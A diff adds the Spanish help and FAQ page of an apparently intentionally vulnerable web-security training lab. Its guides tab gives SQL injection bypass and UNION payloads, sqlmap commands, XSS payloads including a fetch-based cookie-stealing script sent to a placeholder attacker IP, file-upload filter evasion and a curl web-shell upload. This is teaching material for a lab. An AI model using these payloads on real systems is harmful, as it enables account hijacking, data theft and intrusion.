@@ -1,0 +1,235 @@
+{% extends 'base.html' %}
+
+{% block title %}Ayuda y FAQ{% endblock %}
+
+{% block content %}
+<div class="container">
+    <h1 class="mb-4">Centro de Ayuda</h1>
+    <p class="lead">Encuentra respuestas a las preguntas frecuentes y guías sobre cómo utilizar Cadel Academy.</p>
+
+    <ul class="nav nav-tabs mt-5" id="helpTabs" role="tablist">
+        <li class="nav-item" role="presentation">
+            <button class="nav-link active" id="faq-tab" data-bs-toggle="tab" data-bs-target="#faq" type="button" role="tab">Preguntas Frecuentes</button>
+        </li>
+        <li class="nav-item" role="presentation">
+            <button class="nav-link" id="guides-tab" data-bs-toggle="tab" data-bs-target="#guides" type="button" role="tab">Guías de Explotación</button>
+        </li>
+    </ul>
+
+    <div class="tab-content mt-4" id="helpTabsContent">
+        <!-- SECCIÓN FAQ -->
+        <div class="tab-pane fade show active" id="faq" role="tabpanel">
+            <div class="accordion" id="faqAccordion">
+                <!-- FAQ 1-12 -->
+                <div class="accordion-item">
+                    <h2 class="accordion-header"><button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#faq1">¿Cómo funciona el "Modo Vulnerable"?</button></h2>
+                    <div id="faq1" class="accordion-collapse collapse show" data-bs-parent="#faqAccordion">
+                        <div class="accordion-body">Al activar el <strong>Modo Vulnerable</strong>, la aplicación modifica su comportamiento en tiempo real mediante un middleware. Desactiva mecanismos de defensa críticos como la sanitización de salida (HTML Escaping), el uso de consultas SQL parametrizadas y los atributos de seguridad en las cookies (HttpOnly, Secure), exponiendo intencionalmente la superficie de ataque para fines educativos.</div>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <h2 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq2">No puedo iniciar sesión con SQL Injection</button></h2>
+                    <div id="faq2" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                        <div class="accordion-body">Verifique que está operando en el puerto 8080 (HTTP). El payload <code>admin' OR '1'='1' -- -</code> debe inyectarse en el campo de usuario. Es crucial incluir los comentarios finales (<code>-- -</code>) para anular la validación de la contraseña en la consulta SQL subyacente.</div>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <h2 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq3">¿Qué herramientas necesito instalar?</button></h2>
+                    <div id="faq3" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                        <div class="accordion-body">Para una auditoría completa, se recomienda un stack estándar de pentesting: <strong>Burp Suite</strong> o <strong>OWASP ZAP</strong> (Proxy de intercepción), <strong>SQLMap</strong> (Explotación de bases de datos), <strong>Nmap</strong> (Reconocimiento de red) y un navegador con herramientas de desarrollo (DevTools).</div>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <h2 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq4">¿Por qué Nmap no encuentra puertos abiertos?</button></h2>
+                    <div id="faq4" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                        <div class="accordion-body">Si usas Docker en Windows/Mac, escanea <code>localhost</code>. Si estás en Linux, asegúrate de que el firewall no bloquee los puertos 8080 y 8443.</div>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <h2 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq5">¿Es seguro subir archivos reales?</button></h2>
+                    <div id="faq5" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                        <div class="accordion-body">Se recomienda encarecidamente <strong>NO subir información personal o sensible</strong>. Aunque el entorno está contenerizado, las prácticas de seguridad operativa (OpSec) dictan tratar cualquier entorno de laboratorio como potencialmente comprometido. Utilice archivos de prueba ficticios.</div>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <h2 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq6">¿Cómo reinicio la base de datos?</button></h2>
+                    <div id="faq6" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                        <div class="accordion-body">Para restablecer el estado inicial, debe eliminar los volúmenes persistentes de Docker. Ejecute: <code>docker-compose down -v</code> seguido de <code>docker-compose up --build</code>. Esto regenerará la base de datos con los datos semilla predeterminados.</div>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <h2 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq7">¿Qué diferencia hay entre XSS Reflected y Stored?</button></h2>
+                    <div id="faq7" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                        <div class="accordion-body">El <strong>Reflected</strong> (Buscador) rebota el script inmediatamente y solo afecta a quien hace clic en el enlace malicioso. El <strong>Stored</strong> (Foro/Chat) guarda el script en la BD y ataca a cualquiera que visite la página.</div>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <h2 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq8">Burp Suite no intercepta localhost</button></h2>
+                    <div id="faq8" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                        <div class="accordion-body">Muchos navegadores modernos evitan el proxy para direcciones de bucle local. Configure Burp Suite para escuchar en todas las interfaces o acceda a la aplicación mediante la IP de su adaptador de red local (ej. <code>192.168.x.x</code>) en lugar de <code>localhost</code>.</div>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <h2 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq9">¿Cómo funciona el ataque de cookies?</button></h2>
+                    <div id="faq9" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                        <div class="accordion-body">La ausencia del flag <code>HttpOnly</code> permite que el motor JavaScript del navegador acceda al objeto <code>document.cookie</code>. Un atacante puede inyectar código JS (XSS) que lea este valor y lo exfiltre a un servidor bajo su control, permitiendo la suplantación de identidad (Session Hijacking).</div>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <h2 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq10">¿Puedo usar Metasploit aquí?</button></h2>
+                    <div id="faq10" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                        <div class="accordion-body">Sí, especialmente para la vulnerabilidad de Subida de Archivos. Puedes generar un payload con <code>msfvenom</code> e intentar subirlo para obtener una sesión Meterpreter.</div>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <h2 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq11">El navegador marca el sitio seguro como "No Seguro"</button></h2>
+                    <div id="faq11" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                        <div class="accordion-body">Este comportamiento es esperado. El entorno utiliza certificados SSL autofirmados (Self-Signed Certificates) generados localmente, los cuales no son reconocidos por las Autoridades de Certificación (CA) públicas. Debe añadir una excepción de seguridad en su navegador para acceder.</div>
+                    </div>
+                </div>
+                <div class="accordion-item">
+                    <h2 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#faq12">¿Dónde encuentro las flags o soluciones?</button></h2>
+                    <div id="faq12" class="accordion-collapse collapse" data-bs-parent="#faqAccordion">
+                        <div class="accordion-body">Cadel Academy se centra en la comprensión técnica más que en un formato CTF (Capture The Flag) tradicional. Consulte la sección <strong>Blog</strong> para análisis detallados y metodologías de explotación. El éxito se define por la reproducción efectiva de la vulnerabilidad.</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- SECCIÓN GUÍAS -->
+        <div class="tab-pane fade" id="guides" role="tabpanel">
+            <div class="row">
+                <!-- SQL Injection -->
+                <div class="col-md-12 mb-4">
+                    <div class="card border-danger mb-3">
+                        <div class="card-header bg-danger text-white">1. SQL Injection (Login)</div>
+                        <div class="card-body">
+                            <h5>Fase 1: Identificación</h5>
+                            <p>La inyección de caracteres especiales como la comilla simple (<code>'</code>) en el campo de usuario provoca errores de sintaxis SQL, revelando la vulnerabilidad.</p>
+                            
+                            <h5>Fase 2: Automatización (SQLMap)</h5>
+                            <p>Comando para enumeración de bases de datos:</p>
+                            <pre class="bg-dark text-white p-2 rounded">sqlmap -u "http://localhost:8080/login" --data "username=admin&password=123" --dbs --batch</pre>
+                            
+                            <h5>Fase 3: Explotación Manual (Auth Bypass)</h5>
+                            <p>Payload para autenticación administrativa:</p>
+                            <pre class="bg-dark text-white p-2 rounded">admin' OR '1'='1' -- -</pre>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- SQL Injection Chat -->
+                <div class="col-md-12 mb-4">
+                    <div class="card border-danger">
+                        <div class="card-header bg-danger text-white">1.1 SQL Injection (Buscador de Chat)</div>
+                        <div class="card-body">
+                            <h5>Fase 1: Enumeración Booleana</h5>
+                            <p>Listar todos los registros anulando el filtro <code>WHERE</code>:</p>
+                            <pre class="bg-dark text-white p-2 rounded">a' OR '1'='1</pre>
+                            
+                            <h5>Fase 2: Exfiltración vía UNION</h5>
+                            <p>Extracción de metadatos del servidor (versión de MySQL):</p>
+                            <pre class="bg-dark text-white p-2 rounded">' UNION SELECT 1, @@version -- -</pre>
+                            
+                            <h5>Fase 3: Automatización Autenticada</h5>
+                            <p>Como requiere login, debes pasar la cookie de sesión a SQLMap:</p>
+                            <pre class="bg-dark text-white p-2 rounded">sqlmap -u "http://localhost:8080/chat?q=test" --cookie="session=TU_COOKIE_AQUI" --dbs</pre>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- XSS Reflected -->
+                <div class="col-md-12 mb-4">
+                    <div class="card border-warning">
+                        <div class="card-header bg-warning text-dark">2. XSS Reflected (Buscador)</div>
+                        <div class="card-body">
+                            <h5>Fase 1: Prueba de Concepto (PoC)</h5>
+                            <p>Verificación de interpretación HTML básica: <code>&lt;h1&gt;TEST&lt;/h1&gt;</code>. Si se renderiza como título, proceda a inyección JS.</p>
+                            
+                            <h5>Fase 2: Fuzzing con Burp Intruder</h5>
+                            <p>Utilice listas de payloads (ej. <em>Polyglots</em>) en el parámetro <code>q</code> para identificar filtros o WAFs (Web Application Firewalls).</p>
+                            
+                            <h5>Fase 3: Payload Avanzado</h5>
+                            <p>Payload capaz de evadir filtros básicos y ejecutarse en múltiples contextos:</p>
+                            <pre class="bg-dark text-white p-2 rounded">"&gt;&lt;svg/onload=alert(1)&gt;</pre>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- XSS Stored -->
+                <div class="col-md-12 mb-4">
+                    <div class="card border-warning">
+                        <div class="card-header bg-warning text-dark">3. XSS Stored (Foro, Chat y Perfil)</div>
+                        <div class="card-body">
+                            <h5>Fase 1: Identificación de Vectores</h5>
+                            <p>Puntos de inyección persistente: Títulos de Foro, Mensajería Privada y Biografía de Usuario. Payload de prueba: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>.</p>
+                            
+                            <h5>Fase 2: Exfiltración de Sesión (Cookie Stealing)</h5>
+                            <p>Script para enviar la cookie de la víctima a un servidor atacante (requiere listener, ej. <code>nc -lvp 9000</code>):</p>
+                            <pre class="bg-dark text-white p-2 rounded">&lt;script&gt;fetch('http://TU_IP:9000/?cookie=' + document.cookie)&lt;/script&gt;</pre>
+                            
+                            <h5>Fase 3: Defacement Persistente</h5>
+                            <p>Alteración visual permanente del sitio mediante inyección de estilos CSS: <code>&lt;style&gt;body {background: black !important; filter: invert(1);}&lt;/style&gt;</code>.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- File Upload -->
+                <div class="col-md-12 mb-4">
+                    <div class="card border-danger">
+                        <div class="card-header bg-danger text-white">4. Unrestricted File Upload</div>
+                        <div class="card-body">
+                            <h5>Fase 1: XSS vía Archivo</h5>
+                            <p>Subida de archivo <code>payload.html</code> conteniendo JavaScript. Al ser servido por el mismo origen, el script se ejecuta con confianza total.</p>
+                            
+                            <h5>Fase 2: Evasión de Filtros</h5>
+                            <p>Técnicas comunes: Doble extensión (<code>shell.php.jpg</code>), inyección de Null Byte (<code>shell.php%00.jpg</code>) o manipulación del Content-Type.</p>
+                            
+                            <h5>Fase 3: Automatización vía CURL</h5>
+                            <p>Puedes automatizar la subida sin usar el navegador:</p>
+                            <pre class="bg-dark text-white p-2 rounded">curl -X POST -F "file=@shell.php" -F "title=Hacked" http://localhost:8080/forum -b "session=TU_COOKIE"</pre>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Insecure Cookies -->
+                <div class="col-md-12 mb-4">
+                    <div class="card border-info">
+                        <div class="card-header bg-info text-white">5. Gestión de Sesiones</div>
+                        <div class="card-body">
+                            <h5>Fase 1: Auditoría de Atributos</h5>
+                            <p>Inspección mediante DevTools (F12 -> Application -> Cookies). Verificar ausencia de flags <code>HttpOnly</code> (acceso JS) y <code>Secure</code> (transmisión HTTP).</p>
+                            
+                            <h5>Fase 2: Prueba de Concepto (Session Hijacking)</h5>
+                            <p>Copiar el valor de <code>session_id</code>. Inyectarlo manualmente en un navegador diferente o sesión de incógnito. Verificar si se obtiene acceso a la cuenta original.</p>
+                            
+                            <h5>Fase 3: Escaneo Pasivo</h5>
+                            <p>Utilizar el escáner pasivo de <strong>OWASP ZAP</strong> para detectar automáticamente configuraciones de cookies inseguras en todo el sitio.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Reconocimiento -->
+                <div class="col-md-12 mb-4">
+                    <div class="card border-secondary">
+                        <div class="card-header bg-secondary text-white">Extra: Reconocimiento con Nmap</div>
+                        <div class="card-body">
+                            <h5>Fase 1: Descubrimiento de Servicios</h5>
+                            <pre class="bg-dark text-white p-2 rounded">nmap -p- localhost</pre>
+                            
+                            <h5>Fase 2: Enumeración HTTP (NSE Scripts)</h5>
+                            <p>Uso de scripts NSE para descubrir rutas ocultas y analizar <code>robots.txt</code>:</p>
+                            <pre class="bg-dark text-white p-2 rounded">nmap -p 8080 --script http-enum localhost</pre>
+                            
+                            <h5>Fase 3: Fingerprinting</h5>
+                            <pre class="bg-dark text-white p-2 rounded">nmap -sV --script banner -p 8080 localhost</pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+</div>
+
+<!-- Bootstrap JS para el acordeón -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+{% endblock %}
